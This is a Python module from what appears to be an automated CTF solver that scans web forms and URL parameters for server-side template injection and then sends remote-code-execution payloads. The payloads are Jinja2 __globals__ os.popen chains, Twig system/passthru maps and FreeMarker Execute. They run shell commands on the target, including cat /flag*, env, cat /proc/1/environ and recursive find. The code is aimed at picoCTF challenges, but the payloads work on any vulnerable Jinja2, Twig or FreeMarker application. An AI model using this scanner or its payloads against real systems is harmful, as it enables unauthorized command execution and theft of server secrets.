"""
SSTI Module — Server-Side Template Injection  (IMPROVED v3 — bug-fixed)
Aggressive flag extraction after detection.

BUG FIXES (v3):
  - Replaced list-comprehension side-effects with proper for-loops
  - _aggressive_hunt() is now a module-level helper (no change needed, was already OK)
  - add_flag() dedup moved to BaseModule
  - picoCTF-specific announce endpoint tested explicitly
"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class SSTIModule(BaseModule):
    MODULE_NAME = "ssti"
    DESCRIPTION = "Server-Side Template Injection (Jinja2, Twig, etc.)"

    DETECT_PAYLOADS = [
        ("{{7*7}}",    "49"),
        ("{{7*'7'}}", "7777777"),
        ("${7*7}",     "49"),
        ("#{7*7}",     "49"),
        ("<%= 7*7 %>", "49"),
    ]

    JINJA2_FLAG_PAYLOADS = [
        "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
        "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
        "{{lipsum.__globals__['os'].popen('cat /flag*').read()}}",
        "{{lipsum.__globals__['os'].popen('find / -name flag* 2>/dev/null | head -10 | xargs cat 2>/dev/null').read()}}",
        "{{lipsum.__globals__['os'].popen('find / -maxdepth 5 -name \"*.txt\" 2>/dev/null | xargs grep -l flag 2>/dev/null | head -3 | xargs cat 2>/dev/null').read()}}",
        "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
        "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
        "{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}",
        "{{joiner.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
        "{{joiner.__init__.__globals__.os.popen('cat /flag*').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/flag.txt').read()}}{%endif%}{%endfor%}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['open']('/flag').read()}}{%endif%}{%endfor%}",
        "{{lipsum.__globals__['os'].popen('env | grep -i flag').read()}}",
        "{{lipsum.__globals__['os'].popen('env').read()}}",
        "{{lipsum.__globals__['os'].popen('ls /').read()}}",
        "{{lipsum.__globals__['os'].popen('ls /app/ 2>/dev/null; ls /home/ 2>/dev/null; ls /root/ 2>/dev/null').read()}}",
        "{{lipsum.__globals__['os'].popen('cat /proc/1/environ').read()}}",
        "{{config}}",
        "{{request.environ}}",
        "{{namespace.__init__.__globals__.os.popen('cat /flag*').read()}}",
    ]

    TWIG_PAYLOADS = [
        "{{['cat /flag.txt']|map('system')|join}}",
        "{{['cat /flag*']|map('passthru')|join}}",
    ]
    FREEMARKER_PAYLOADS = [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag*")}',
    ]

    def run(self) -> dict:
        self.log(f"[SSTI] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        # Hunt flags in initial page response
        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        forms = Parser.extract_forms(resp.text)
        self.log(f"[SSTI] Found {len(forms)} form(s)")
        for form in forms:
            self._test_form(form)

        self._test_url_params()

        # picoCTF STI challenges commonly expose /announce or POST to /
        self._try_picoctf_announce_endpoint()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    # ── helpers ───────────────────────────────────────────────────────────────

    def _resolve_action(self, form):
        a = form["action"] or self.target_url
        if not a.startswith("http"):
            a = self.target_url.rstrip("/") + "/" + a.lstrip("/")
        return a

    def _make_data(self, form, field_name, payload):
        return {i["name"]: (payload if i["name"] == field_name else i["value"] or "x")
                for i in form["inputs"] if i["name"]}

    def _req(self, action, data, method):
        return (self.requester.post(action, data=data) if method == "POST"
                else self.requester.get(action, params=data))

    def _test_form(self, form):
        action = self._resolve_action(form)
        for field in form["inputs"]:
            if field["type"] in ("submit", "button") or not field["name"]:
                continue
            for payload, expected in self.DETECT_PAYLOADS:
                data = self._make_data(form, field["name"], payload)
                r    = self._req(action, data, form["method"])
                if r and expected in r.text:
                    engine = "jinja2" if "7777777" in r.text else "generic"
                    self.add_vuln({"type": "ssti_detected", "field": field["name"],
                                   "payload": payload, "engine": engine})
                    self.log(f"[SSTI] Confirmed via {payload} | engine={engine}")
                    # BUG FIX: was [self.add_flag(f) for f in flags] — list
                    # comprehensions for side-effects are a Python anti-pattern;
                    # they waste memory building a list of Nones.
                    for f in FlagHunter.hunt(r.text):
                        self.add_flag(f)
                    self._extract_flag_form(action, form, field["name"])
                    return

    def _extract_flag_form(self, action, form, vuln_field):
        self.log(f"[SSTI] Running {len(self.JINJA2_FLAG_PAYLOADS)} RCE payloads...")
        all_p = self.JINJA2_FLAG_PAYLOADS + self.TWIG_PAYLOADS + self.FREEMARKER_PAYLOADS
        for payload in all_p:
            data = self._make_data(form, vuln_field, payload)
            r    = self._req(action, data, form["method"])
            if r is None:
                continue
            snippet = r.text[:400].strip()
            if snippet:
                self.log(f"[SSTI] Output: {snippet[:150]}")
            flags = FlagHunter.hunt(r.text)
            if flags:
                for f in flags:           # BUG FIX: was list-comp side-effect
                    self.add_flag(f)
                self.add_vuln({"type": "ssti_flag_captured", "payload": payload, "flags": flags})
                self.log(f"[SSTI] FLAG CAPTURED via {payload[:70]}")
                return True
            af = _aggressive_hunt(r.text)
            if af:
                for f in af:              # BUG FIX: was list-comp side-effect
                    self.add_flag(f)
                return True
        self.log("[SSTI] No flag found — check terminal logs for output clues.")
        return False

    def _test_url_params(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            for payload, expected in self.DETECT_PAYLOADS:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r    = self.requester.raw_get(url)
                if r and expected in r.text:
                    self.add_vuln({"type": "ssti_url_param", "param": param, "payload": payload})
                    self.log(f"[SSTI] URL param '{param}' vulnerable!")
                    for f in FlagHunter.hunt(r.text):  # BUG FIX: for-loop
                        self.add_flag(f)
                    self._extract_flag_url_param(parsed, params, param)
                    return

    def _extract_flag_url_param(self, parsed, params, vuln_param):
        self.log(f"[SSTI] Extracting flag via URL param '{vuln_param}'...")
        for payload in self.JINJA2_FLAG_PAYLOADS:
            test = {**params, vuln_param: payload}
            url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
            r    = self.requester.raw_get(url)
            if r is None:
                continue
            self.log(f"[SSTI] URL output: {r.text[:150].strip()}")
            flags = FlagHunter.hunt(r.text)
            if flags:
                for f in flags:           # BUG FIX: for-loop
                    self.add_flag(f)
                self.add_vuln({"type": "ssti_url_flag_captured", "param": vuln_param,
                               "payload": payload, "flags": flags})
                self.log(f"[SSTI] FLAG via URL param: {payload[:70]}")
                return
            af = _aggressive_hunt(r.text)
            if af:
                for f in af:              # BUG FIX: for-loop
                    self.add_flag(f)
                return

    def _try_picoctf_announce_endpoint(self):
        """
        picoCTF STI challenges (e.g. STI1) expose the SSTI via a POST form that
        renders user-supplied text through Jinja2.  The page typically has a
        single <textarea name="content"> or <input name="announcement">.
        We probe common field names directly in case the HTML parser missed the form.
        """
        COMMON_FIELDS = ["content", "announcement", "message", "text", "name",
                         "input", "q", "search", "msg", "body", "template"]
        PROBE = "{{7*'7'}}"
        EXPECTED = "7777777"

        for field in COMMON_FIELDS:
            r = self.requester.post(self.target_url, data={field: PROBE})
            if r and EXPECTED in r.text:
                self.add_vuln({"type": "ssti_detected", "field": field,
                               "payload": PROBE, "engine": "jinja2"})
                self.log(f"[SSTI][picoCTF] Jinja2 SSTI confirmed on field='{field}'")
                for payload in self.JINJA2_FLAG_PAYLOADS:
                    r2 = self.requester.post(self.target_url, data={field: payload})
                    if r2 is None:
                        continue
                    self.log(f"[SSTI][picoCTF] Response snippet: {r2.text[:200].strip()}")
                    flags = FlagHunter.hunt(r2.text)
                    if flags:
                        for f in flags:
                            self.add_flag(f)
                        self.add_vuln({"type": "ssti_flag_captured",
                                       "payload": payload, "flags": flags})
                        self.log(f"[SSTI][picoCTF] FLAG CAPTURED: {flags}")
                        return
                    af = _aggressive_hunt(r2.text)
                    if af:
                        for f in af:
                            self.add_flag(f)
                        return
                break  # found vulnerable field; no need to try others


# ── Module-level aggressive hunter ───────────────────────────────────────────

def _aggressive_hunt(text: str) -> list:
    patterns = [
        r"picoCTF\{[^}]+\}",
        r"[A-Za-z0-9_]{2,12}\{[A-Za-z0-9_\-!@#$%^&*()+=/\\:;,.?<>|]{3,80}\}",
        r"[0-9a-f]{32,64}",
    ]
    found = set()
    for pat in patterns:
        for m in re.finditer(pat, text, re.IGNORECASE):
            found.add(m.group(0))
    return list(found)
